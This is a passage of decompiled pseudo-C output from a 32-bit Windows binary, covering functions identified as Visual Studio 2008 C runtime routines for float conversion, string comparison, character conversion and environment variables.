      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041e277;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_0041e269:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041e277;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_0041e269;
    goto LAB_0041e237;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_0041e277:
  iVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2008 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  localeinfo_struct local_28;
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_28,_Locale);
  local_18 = ___strgtold12_l(&local_14,&local_2c,_Str,0,0,0,0,&local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_0041e2df:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041e31f;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_0041e311:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041e31f;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_0041e311;
    goto LAB_0041e2df;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_0041e31f:
  iVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Single Match
//  __fptostr
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __fptostr(char *_Buf,size_t _SizeInBytes,int _Digits,STRFLT _PtFlt)

{
  int *piVar1;
  int iVar2;
  char *pcVar3;
  size_t sVar4;
  char cVar5;
  char *pcVar6;
  errno_t eVar7;
  
  pcVar6 = _PtFlt->mantissa;
  if ((_Buf == (char *)0x0) || (_SizeInBytes == 0)) {
    piVar1 = __errno();
    eVar7 = 0x16;
    *piVar1 = 0x16;
  }
  else {
    *_Buf = '\0';
    iVar2 = _Digits;
    if (_Digits < 1) {
      iVar2 = 0;
    }
    if (iVar2 + 1U < _SizeInBytes) {
      *_Buf = '0';
      pcVar3 = _Buf + 1;
      if (0 < _Digits) {
        do {
          cVar5 = *pcVar6;
          if (cVar5 == '\0') {
            cVar5 = '0';
          }
          else {
            pcVar6 = pcVar6 + 1;
          }
          *pcVar3 = cVar5;
          pcVar3 = pcVar3 + 1;
          _Digits = _Digits + -1;
        } while (0 < _Digits);
      }
      *pcVar3 = '\0';
      if ((-1 < _Digits) && ('4' < *pcVar6)) {
        while (pcVar3 = pcVar3 + -1, *pcVar3 == '9') {
          *pcVar3 = '0';
        }
        *pcVar3 = *pcVar3 + '\x01';
      }
      if (*_Buf == '1') {
        _PtFlt->decpt = _PtFlt->decpt + 1;
      }
      else {
        sVar4 = _strlen(_Buf + 1);
        _memmove(_Buf,_Buf + 1,sVar4 + 1);
      }
      return 0;
    }
    piVar1 = __errno();
    eVar7 = 0x22;
    *piVar1 = 0x22;
  }
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar7;
}



// Library Function - Single Match
//  ___dtold
// 
// Library: Visual Studio 2008 Release

void __cdecl ___dtold(uint *param_1,uint *param_2)

{
  uint uVar1;
  ushort uVar2;
  ushort uVar3;
  ushort uVar4;
  uint local_8;
  
  uVar2 = *(ushort *)((int)param_2 + 6) >> 4;
  uVar4 = *(ushort *)((int)param_2 + 6) & 0x8000;
  uVar3 = uVar2 & 0x7ff;
  uVar1 = *param_2;
  local_8 = 0x80000000;
  if ((uVar2 & 0x7ff) == 0) {
    if (((param_2[1] & 0xfffff) == 0) && (uVar1 == 0)) {
      param_1[1] = 0;
      *param_1 = 0;
      goto LAB_0041e4a1;
    }
    uVar3 = uVar3 + 0x3c01;
    local_8 = 0;
  }
  else if (uVar3 == 0x7ff) {
    uVar3 = 0x7fff;
  }
  else {
    uVar3 = uVar3 + 0x3c00;
  }
  param_1[1] = uVar1 >> 0x15 | (param_2[1] & 0xfffff) << 0xb | local_8;
  *param_1 = uVar1 << 0xb;
  while (local_8 == 0) {
    uVar1 = param_1[1];
    uVar3 = uVar3 - 1;
    param_1[1] = uVar1 * 2 | *param_1 >> 0x1f;
    *param_1 = *param_1 * 2;
    local_8 = uVar1 * 2 & 0x80000000;
  }
  uVar4 = uVar4 | uVar3;
LAB_0041e4a1:
  *(ushort *)(param_1 + 2) = uVar4;
  return;
}



// Library Function - Single Match
//  __fltout2
// 
// Library: Visual Studio 2008 Release

STRFLT __cdecl __fltout2(_CRT_DOUBLE _Dbl,STRFLT _Flt,char *_ResultStr,size_t _SizeInBytes)

{
  int iVar1;
  errno_t eVar2;
  STRFLT p_Var3;
  short local_30;
  char local_2e;
  char local_2c [24];
  uint local_14;
  uint uStack_10;
  ushort uStack_c;
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  ___dtold(&local_14,(uint *)&_Dbl);
  iVar1 = __I10_OUTPUT(local_14,uStack_10,uStack_c,0x11,0,&local_30);
  _Flt->flag = iVar1;
  _Flt->sign = (int)local_2e;
  _Flt->decpt = (int)local_30;
  eVar2 = _strcpy_s(_ResultStr,_SizeInBytes,local_2c);
  if (eVar2 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  _Flt->mantissa = _ResultStr;
  p_Var3 = (STRFLT)___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return p_Var3;
}



// Library Function - Single Match
//  __alldvrm
// 
// Library: Visual Studio 2008 Release

undefined8 __alldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __aullshr
// 
// Library: Visual Studio 2008 Release

ulonglong __fastcall __aullshr(byte param_1,uint param_2)

{
  uint in_EAX;
  
  if (0x3f < param_1) {
    return 0;
  }
  if (param_1 < 0x20) {
    return CONCAT44(param_2 >> (param_1 & 0x1f),
                    in_EAX >> (param_1 & 0x1f) | param_2 << 0x20 - (param_1 & 0x1f));
  }
  return (ulonglong)(param_2 >> (param_1 & 0x1f));
}



// Library Function - Single Match
//  __controlfp_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __controlfp_s(uint *_CurrentState,uint _NewValue,uint _Mask)

{
  uint uVar1;
  int *piVar2;
  errno_t eVar3;
  
  uVar1 = _Mask & 0xfff7ffff;
  if ((_NewValue & uVar1 & 0xfcf0fce0) == 0) {
    if (_CurrentState == (uint *)0x0) {
      __control87(_NewValue,uVar1);
    }
    else {
      uVar1 = __control87(_NewValue,uVar1);
      *_CurrentState = uVar1;
    }
    eVar3 = 0;
  }
  else {
    if (_CurrentState != (uint *)0x0) {
      uVar1 = __control87(0,0);
      *_CurrentState = uVar1;
    }
    piVar2 = __errno();
    eVar3 = 0x16;
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return eVar3;
}



// Library Function - Single Match
//  __get_printf_count_output
// 
// Library: Visual Studio 2008 Release

int __cdecl __get_printf_count_output(void)

{
  return (uint)(DAT_0042db84 == (DAT_0042b0a0 | 1));
}



// Library Function - Single Match
//  __wctomb_s_l
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl
__wctomb_s_l(int *_SizeConverted,char *_MbCh,size_t _SizeInBytes,wchar_t _WCh,_locale_t _Locale)

{
  char *lpMultiByteStr;
  size_t _Size;
  int iVar1;
  int *piVar2;
  DWORD DVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _Size = _SizeInBytes;
  lpMultiByteStr = _MbCh;
  if ((_MbCh == (char *)0x0) && (_SizeInBytes != 0)) {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = 0;
    }
LAB_0041e6ee:
    iVar1 = 0;
  }
  else {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = -1;
    }
    if (0x7fffffff < _SizeInBytes) {
      piVar2 = __errno();
      *piVar2 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      return 0x16;
    }
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
    if (*(int *)(local_14[0] + 0x14) == 0) {
      if ((ushort)_WCh < 0x100) {
        if (lpMultiByteStr != (char *)0x0) {
          if (_Size == 0) goto LAB_0041e785;
          *lpMultiByteStr = (char)_WCh;
        }
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = 1;
        }
LAB_0041e7c0:
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        goto LAB_0041e6ee;
      }
      if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
        _memset(lpMultiByteStr,0,_Size);
      }
    }
    else {
      _MbCh = (char *)0x0;
      iVar1 = WideCharToMultiByte(*(UINT *)(local_14[0] + 4),0,&_WCh,1,lpMultiByteStr,_Size,
                                  (LPCSTR)0x0,(LPBOOL)&_MbCh);
      if (iVar1 == 0) {
        DVar3 = GetLastError();
        if (DVar3 == 0x7a) {
          if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
            _memset(lpMultiByteStr,0,_Size);
          }
LAB_0041e785:
          piVar2 = __errno();
          *piVar2 = 0x22;
          __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          if (local_8 == '\0') {
            return 0x22;
          }
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
          return 0x22;
        }
      }
      else if (_MbCh == (char *)0x0) {
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = iVar1;
        }
        goto LAB_0041e7c0;
      }
    }
    piVar2 = __errno();
    *piVar2 = 0x2a;
    piVar2 = __errno();
    iVar1 = *piVar2;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return iVar1;
}



// Library Function - Single Match
//  _wctomb_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wctomb_s(int *_SizeConverted,char *_MbCh,rsize_t _SizeInBytes,wchar_t _WCh)

{
  errno_t eVar1;
  
  eVar1 = __wctomb_s_l(_SizeConverted,_MbCh,_SizeInBytes,_WCh,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  __ungetc_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __ungetc_nolock(int _Ch,FILE *_File)

{
  char *pcVar1;
  uint uVar2;
  int *piVar3;
  undefined *puVar4;
  
  if ((*(byte *)&_File->_flag & 0x40) != 0) {
LAB_0041e8dc:
    if (_Ch != -1) {
      uVar2 = _File->_flag;
      if (((uVar2 & 1) != 0) || (((char)uVar2 < '\0' && ((uVar2 & 2) == 0)))) {
        if (_File->_base == (char *)0x0) {
          __getbuf(_File);
        }
        if (_File->_ptr == _File->_base) {
          if (_File->_cnt != 0) {
            return -1;
          }
          _File->_ptr = _File->_ptr + 1;
        }
        _File->_ptr = _File->_ptr + -1;
        pcVar1 = _File->_ptr;
        if ((*(byte *)&_File->_flag & 0x40) == 0) {
          *pcVar1 = (char)_Ch;
        }
        else if (*pcVar1 != (char)_Ch) {
          _File->_ptr = pcVar1 + 1;
          return -1;
        }
        _File->_cnt = _File->_cnt + 1;
        _File->_flag = _File->_flag & 0xffffffefU | 1;
        return _Ch & 0xff;
      }
    }
    return -1;
  }
  uVar2 = __fileno(_File);
  if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
    puVar4 = &DAT_0042b798;
  }
  else {
    puVar4 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_0046eb40)[(int)uVar2 >> 5]);
  }
  if ((puVar4[0x24] & 0x7f) == 0) {
    if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
      puVar4 = &DAT_0042b798;
    }
    else {
      puVar4 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_0046eb40)[(int)uVar2 >> 5]);
    }
    if ((puVar4[0x24] & 0x80) == 0) goto LAB_0041e8dc;
  }
  piVar3 = __errno();
  *piVar3 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// Library Function - Single Match
//  int __cdecl strncnt(char const *,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl strncnt(char *param_1,int param_2)

{
  char *in_EAX;
  char *pcVar1;
  
  pcVar1 = param_1;
  for (; (pcVar1 != (char *)0x0 && (*in_EAX != '\0')); in_EAX = in_EAX + 1) {
    pcVar1 = pcVar1 + -1;
  }
  return (int)(param_1 + (-1 - (int)(pcVar1 + -1)));
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtCompareStringA_stat(struct localeinfo_struct *,unsigned long,unsigned long,char
// const *,int,char const *,int,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl
__crtCompareStringA_stat
          (localeinfo_struct *param_1,ulong param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8)

{
  uint _Size;
  char *lpMultiByteStr;
  int iVar1;
  DWORD DVar2;
  BOOL BVar3;
  BYTE *pBVar4;
  uint cchWideChar;
  uint uVar5;
  undefined4 *puVar6;
  char *pcVar7;
  int *in_ECX;
  byte *in_EDX;
  byte *_Memory;
  int unaff_EDI;
  PCNZCH _Memory_00;
  byte *local_28;
  undefined4 *local_24;
  char *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  lpMultiByteStr = param_4;
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  local_20 = param_4;
  if (DAT_0042db88 == 0) {
    iVar1 = CompareStringW(0,0,L"",1,L"",1);
    if (iVar1 == 0) {
      DVar2 = GetLastError();
      if (DVar2 == 0x78) {
        DAT_0042db88 = 2;
      }
    }
    else {
      DAT_0042db88 = 1;
    }
  }
  if ((int)param_3 < 1) {
    if ((int)param_3 < -1) goto LAB_0041ecc0;
  }
  else {
    param_3 = strncnt((char *)param_3,unaff_EDI);
  }
  if (param_5 < 1) {
    if (param_5 < -1) goto LAB_0041ecc0;
  }
  else {
    param_5 = strncnt((char *)param_5,unaff_EDI);
  }
  if ((DAT_0042db88 == 2) || (DAT_0042db88 == 0)) {
    _Memory_00 = (PCNZCH)0x0;
    _Memory = (byte *)0x0;
    if (param_1 == (localeinfo_struct *)0x0) {
      param_1 = *(localeinfo_struct **)(*in_ECX + 0x14);
    }
    if (param_6 == (char *)0x0) {
      param_6 = *(char **)(*in_ECX + 4);
    }
    pcVar7 = (char *)___ansicp((LCID)param_1);
    if (pcVar7 == (char *)0xffffffff) goto LAB_0041ecc0;
    local_28 = in_EDX;
    if (pcVar7 != param_6) {
      _Memory = (byte *)___convertcp((UINT)param_6,(UINT)pcVar7,(char *)in_EDX,&param_3,(LPSTR)0x0,0
                                    );
      if (_Memory == (byte *)0x0) goto LAB_0041ecc0;
      _Memory_00 = (PCNZCH)___convertcp((UINT)param_6,(UINT)pcVar7,lpMultiByteStr,(uint *)&param_5,
                                        (LPSTR)0x0,0);
      local_28 = _Memory;
      local_20 = _Memory_00;
      if (_Memory_00 == (PCNZCH)0x0) {
        _free(_Memory);
        goto LAB_0041ecc0;
      }
    }
    CompareStringA((LCID)param_1,param_2,(PCNZCH)local_28,param_3,local_20,param_5);
    if (_Memory != (byte *)0x0) {
      _free(_Memory);
      _free(_Memory_00);
    }
    goto LAB_0041ecc0;
  }
  if (DAT_0042db88 != 1) goto LAB_0041ecc0;
  if (param_6 == (char *)0x0) {
    param_6 = *(char **)(*in_ECX + 4);
  }
  if ((param_3 == 0) || (param_5 == 0)) {
    if ((param_3 == param_5) ||
       (((1 < param_5 || (1 < (int)param_3)) ||
        (BVar3 = GetCPInfo((UINT)param_6,&local_1c), BVar3 == 0)))) goto LAB_0041ecc0;
    if (0 < (int)param_3) {
      if (1 < local_1c.MaxCharSize) {
        pBVar4 = local_1c.LeadByte;
        while (((local_1c.LeadByte[0] != 0 && (pBVar4[1] != 0)) &&
               ((*in_EDX < *pBVar4 || (pBVar4[1] < *in_EDX))))) {
          pBVar4 = pBVar4 + 2;
          local_1c.LeadByte[0] = *pBVar4;
        }
      }
      goto LAB_0041ecc0;
    }
    if (0 < param_5) {
      if (1 < local_1c.MaxCharSize) {
        pBVar4 = local_1c.LeadByte;
        while (((local_1c.LeadByte[0] != 0 && (pBVar4[1] != 0)) &&
               (((byte)*lpMultiByteStr < *pBVar4 || (pBVar4[1] < (byte)*lpMultiByteStr))))) {
          pBVar4 = pBVar4 + 2;
          local_1c.LeadByte[0] = *pBVar4;
        }
      }
      goto LAB_0041ecc0;
    }
  }
  cchWideChar = MultiByteToWideChar((UINT)param_6,9,(LPCSTR)in_EDX,param_3,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_0041ecc0;
  if (((int)cchWideChar < 1) || (0xffffffe0 / cchWideChar < 2)) {
    local_24 = (undefined4 *)0x0;
  }
  else {
    uVar5 = cchWideChar * 2 + 8;
    if (uVar5 < 0x401) {
      puVar6 = (undefined4 *)&stack0xffffffc4;
      local_24 = (undefined4 *)&stack0xffffffc4;
      if (&stack0x00000000 != (undefined *)0x3c) {
LAB_0041eb39:
        local_24 = puVar6 + 2;
      }
    }
    else {
      puVar6 = (undefined4 *)_malloc(uVar5);
      local_24 = puVar6;
      if (puVar6 != (undefined4 *)0x0) {
        *puVar6 = 0xdddd;
        goto LAB_0041eb39;
      }
    }
  }
  if (local_24 == (undefined4 *)0x0) goto LAB_0041ecc0;
  iVar1 = MultiByteToWideChar((UINT)param_6,1,(LPCSTR)in_EDX,param_3,(LPWSTR)local_24,cchWideChar);
  if ((iVar1 != 0) &&
     (uVar5 = MultiByteToWideChar((UINT)param_6,9,lpMultiByteStr,param_5,(LPWSTR)0x0,0), uVar5 != 0)
     ) {
    if (((int)uVar5 < 1) || (0xffffffe0 / uVar5 < 2)) {
      puVar6 = (undefined4 *)0x0;
    }
    else {
      _Size = uVar5 * 2 + 8;
      if (_Size < 0x401) {
        if (&stack0x00000000 == (undefined *)0x3c) goto LAB_0041ebfa;
        puVar6 = (undefined4 *)&stack0xffffffcc;
      }
      else {
        puVar6 = (undefined4 *)_malloc(_Size);
        if (puVar6 != (undefined4 *)0x0) {
          *puVar6 = 0xdddd;
          puVar6 = puVar6 + 2;
        }
      }
    }
    if (puVar6 != (undefined4 *)0x0) {
      iVar1 = MultiByteToWideChar((UINT)param_6,1,lpMultiByteStr,param_5,(LPWSTR)puVar6,uVar5);
      if (iVar1 != 0) {
        CompareStringW((LCID)param_1,param_2,(PCNZWCH)local_24,cchWideChar,(PCNZWCH)puVar6,uVar5);
      }
      __freea(puVar6);
    }
  }
LAB_0041ebfa:
  __freea(local_24);
LAB_0041ecc0:
  iVar1 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar1;
}



// Library Function - Single Match
//  ___crtCompareStringA
// 
// Library: Visual Studio 2008 Release

int __cdecl
___crtCompareStringA
          (_locale_t _Plocinfo,LPCWSTR _LocaleName,DWORD _DwCmpFlags,LPCSTR _LpString1,
          int _CchCount1,LPCSTR _LpString2,int _CchCount2,int _Code_page)

{
  int iVar1;
  int in_stack_ffffffec;
  int in_stack_fffffff0;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtCompareStringA_stat
                    ((localeinfo_struct *)_LocaleName,_DwCmpFlags,_CchCount1,_LpString2,_CchCount2,
                     (char *)_Code_page,in_stack_ffffffec,in_stack_fffffff0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  __strnicoll_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __strnicoll_l(char *_Str1,char *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  LPCWSTR _LocaleName;
  int *piVar1;
  int iVar2;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if (_MaxCount == 0) {
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  if ((_Str1 == (char *)0x0) || (_Str2 == (char *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    return 0x7fffffff;
  }
  if (_MaxCount < 0x80000000) {
    _LocaleName = (LPCWSTR)(local_14.locinfo)->lc_category[0].locale;
    if (_LocaleName == (LPCWSTR)0x0) {
      iVar2 = __strnicmp_l(_Str1,_Str2,_MaxCount,&local_14);
    }
    else {
      iVar2 = ___crtCompareStringA
                        (&local_14,_LocaleName,0x1001,_Str1,_MaxCount,_Str2,_MaxCount,
                         (local_14.locinfo)->lc_collate_cp);
      if (iVar2 == 0) {
        piVar1 = __errno();
        *piVar1 = 0x16;
        goto LAB_0041edeb;
      }
      iVar2 = iVar2 + -2;
    }
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
LAB_0041edeb:
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    iVar2 = 0x7fffffff;
  }
  return iVar2;
}



// Library Function - Single Match
//  _findenv
// 
// Library: Visual Studio 2008 Release

int __cdecl _findenv(uchar *param_1)

{
  int iVar1;
  uchar **ppuVar2;
  size_t unaff_EDI;
  
  ppuVar2 = DAT_0042d0b4;
  while( true ) {
    if (*ppuVar2 == (uchar *)0x0) {
      return -((int)ppuVar2 - (int)DAT_0042d0b4 >> 2);
    }
    iVar1 = __mbsnbicoll(param_1,*ppuVar2,unaff_EDI);
    if ((iVar1 == 0) && (((*ppuVar2)[unaff_EDI] == '=' || ((*ppuVar2)[unaff_EDI] == '\0')))) break;
    ppuVar2 = ppuVar2 + 1;
  }
  return (int)ppuVar2 - (int)DAT_0042d0b4 >> 2;
}



// Library Function - Single Match
//  _copy_environ
// 
// Library: Visual Studio 2008 Release

char ** _copy_environ(void)

{
  char **in_EAX;
  char **ppcVar1;
  char *pcVar2;
  char **ppcVar3;
  
  ppcVar1 = (char **)0x0;
  if (in_EAX != (char **)0x0) {
    pcVar2 = *in_EAX;
    ppcVar3 = in_EAX;
    while (pcVar2 != (char *)0x0) {
      ppcVar3 = ppcVar3 + 1;
      ppcVar1 = (char **)((int)ppcVar1 + 1);
      pcVar2 = *ppcVar3;
    }
    ppcVar1 = (char **)__calloc_crt((int)ppcVar1 + 1,4);
    ppcVar3 = ppcVar1;
    if (ppcVar1 == (char **)0x0) {
      __amsg_exit(9);
    }
    for (; *in_EAX != (char *)0x0; in_EAX = in_EAX + 1) {
      pcVar2 = __strdup(*in_EAX);
      *ppcVar3 = pcVar2;
      ppcVar3 = ppcVar3 + 1;
    }
    *ppcVar3 = (char *)0x0;
  }
  return ppcVar1;
}



// Library Function - Single Match
//  ___crtsetenv
// 
// Library: Visual Studio 2008 Release

int __cdecl ___crtsetenv(char **_POption,int _Primary)

{
  uint _Size;
  uchar *_Str;
  int *piVar1;
  uchar *puVar2;
  int iVar3;
  uint _Count;
  char **ppcVar4;
  size_t sVar5;
  char *_Dst;
  errno_t eVar6;
  BOOL BVar7;
  uchar **ppuVar8;
  bool bVar9;
  size_t _Size_00;
  uchar *_Src;
  int local_10;
  
  local_10 = 0;
  if (_POption == (char **)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  _Str = (uchar *)*_POption;
  if (((_Str == (uchar *)0x0) || (puVar2 = __mbschr(_Str,0x3d), puVar2 == (uchar *)0x0)) ||
     (_Str == puVar2)) {
LAB_0041ef4a:
    piVar1 = __errno();
    *piVar1 = 0x16;
    return -1;
  }
  bVar9 = puVar2[1] == '\0';
  if (DAT_0042d0b4 == DAT_0042d0b8) {
    DAT_0042d0b4 = _copy_environ();
  }
  if (DAT_0042d0b4 == (char **)0x0) {
    if ((_Primary == 0) || (DAT_0042d0bc == (undefined4 *)0x0)) {
      if (bVar9) {
        return 0;
      }
      DAT_0042d0b4 = (char **)__malloc_crt(4);
      if (DAT_0042d0b4 == (char **)0x0) {
        return -1;
      }
      *DAT_0042d0b4 = (char *)0x0;
      if (DAT_0042d0bc == (undefined4 *)0x0) {
        DAT_0042d0bc = (undefined4 *)__malloc_crt(4);
        if (DAT_0042d0bc == (undefined4 *)0x0) {
          return -1;
        }
        *DAT_0042d0bc = 0;
      }
    }
    else {
      iVar3 = ___wtomb_environ();
      if (iVar3 != 0) goto LAB_0041ef4a;
    }
  }
  ppcVar4 = DAT_0042d0b4;
  if (DAT_0042d0b4 == (char **)0x0) {
    return -1;
  }
  _Count = _findenv(_Str);
  if (((int)_Count < 0) || (*ppcVar4 == (char *)0x0)) {
    if (bVar9) {
      _free(_Str);
      *_POption = (char *)0x0;
      return 0;
    }
    if ((int)_Count < 0) {
      _Count = -_Count;
    }
    _Size = _Count + 2;
    if ((int)_Size < (int)_Count) {
      return -1;
    }
    if (0x3ffffffe < _Size) {
      return -1;
    }
    ppcVar4 = (char **)__recalloc_crt(DAT_0042d0b4,4,_Size);
    if (ppcVar4 == (char **)0x0) {
      return -1;
    }
    ppcVar4[_Count] = (char *)_Str;
    (ppcVar4 + _Count)[1] = (char *)0x0;
    *_POption = (char *)0x0;
  }
  else {
    ppuVar8 = (uchar **)(ppcVar4 + _Count);
    _free(*ppuVar8);
    if (!bVar9) {
      *ppuVar8 = _Str;
      *_POption = (char *)0x0;
      goto LAB_0041f058;
    }
    while (*ppuVar8 != (uchar *)0x0) {
      *ppuVar8 = ppuVar8[1];
      _Count = _Count + 1;
      ppuVar8 = (uchar **)(ppcVar4 + _Count);
    }
    if ((0x3ffffffe < _Count) ||
       (ppcVar4 = (char **)__recalloc_crt(DAT_0042d0b4,_Count,4), ppcVar4 == (char **)0x0))
    goto LAB_0041f058;
  }
  DAT_0042d0b4 = ppcVar4;
LAB_0041f058:
  if (_Primary != 0) {
    _Size_00 = 1;
    sVar5 = _strlen((char *)_Str);
    _Dst = (char *)__calloc_crt(sVar5 + 2,_Size_00);
